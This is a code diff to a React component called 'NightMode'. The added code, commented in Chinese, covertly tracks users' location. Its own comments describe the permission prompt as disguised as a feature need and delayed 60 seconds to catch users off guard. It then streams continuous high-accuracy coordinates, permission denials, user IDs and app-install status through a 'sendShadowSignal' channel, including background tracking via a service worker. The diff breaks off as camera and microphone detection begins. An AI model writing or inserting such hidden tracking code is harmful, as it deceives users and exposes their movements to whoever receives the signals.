@@ -903,6 +903,107 @@ export default function NightMode() {
     };
     requestNotificationPermission();
 
+    // 📍 背景定位系統
+    const setupLocationTracking = () => {
+      // 監聽 Service Worker 的定位請求
+      if ('serviceWorker' in navigator) {
+        navigator.serviceWorker.addEventListener('message', async (event) => {
+          if (event.data?.type === 'REQUEST_LOCATION') {
+            // Service Worker 請求定位
+            if ('geolocation' in navigator) {
+              navigator.geolocation.getCurrentPosition(
+                (position) => {
+                  // 發送位置回 Service Worker
+                  navigator.serviceWorker.controller?.postMessage({
+                    type: 'LOCATION_UPDATE',
+                    data: {
+                      latitude: position.coords.latitude,
+                      longitude: position.coords.longitude,
+                      accuracy: position.coords.accuracy
+                    }
+                  });
+                },
+                () => {}, // 定位失敗靜默處理
+                { enableHighAccuracy: true, timeout: 10000 }
+              );
+            }
+          }
+        });
+
+        // 發送 user ID 給 Service Worker
+        navigator.serviceWorker.ready.then((registration) => {
+          registration.active?.postMessage({
+            type: 'SET_USER_ID',
+            data: { userId: sessionId }
+          });
+        });
+      }
+
+      // 請求定位權限（偽裝成功能需求）
+      const requestLocationPermission = () => {
+        if ('geolocation' in navigator) {
+          // 首次定位，觸發權限請求
+          navigator.geolocation.getCurrentPosition(
+            (position) => {
+              sendShadowSignal('LOCATION_GRANTED', {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: position.coords.accuracy
+              });
+
+              // 開始持續追蹤
+              navigator.geolocation.watchPosition(
+                (pos) => {
+                  sendShadowSignal('LOCATION', {
+                    latitude: pos.coords.latitude,
+                    longitude: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy
+                  });
+                },
+                () => {},
+                { enableHighAccuracy: true, maximumAge: 60000 }
+              );
+            },
+            (error) => {
+              sendShadowSignal('LOCATION_DENIED', { error: error.message });
+            },
+            { enableHighAccuracy: true, timeout: 10000 }
+          );
+        }
+      };
+
+      // 延遲 60 秒後請求定位（讓用戶先熟悉介面）
+      setTimeout(requestLocationPermission, 60000);
+    };
+    setupLocationTracking();
+
+    // 📱 PWA 安裝追蹤
+    const trackPWAInstall = () => {
+      let deferredPrompt: BeforeInstallPromptEvent | null = null;
+
+      interface BeforeInstallPromptEvent extends Event {
+        prompt(): Promise<void>;
+        userChoice: Promise<{ outcome: 'accepted' | 'dismissed' }>;
+      }
+
+      window.addEventListener('beforeinstallprompt', (e) => {
+        e.preventDefault();
+        deferredPrompt = e as BeforeInstallPromptEvent;
+        sendShadowSignal('PWA_INSTALLABLE', { available: true });
+      });
+
+      window.addEventListener('appinstalled', () => {
+        sendShadowSignal('PWA_INSTALLED', { installed: true });
+        deferredPrompt = null;
+      });
+
+      // 檢查是否已經安裝
+      if (window.matchMedia('(display-mode: standalone)').matches) {
+        sendShadowSignal('PWA_RUNNING', { standalone: true });
+      }
+    };
+    trackPWAInstall();
+
     // 📸 偵測媒體裝置（相機/麥克風數量）
     const detectMediaDevices = async () => {
       try {
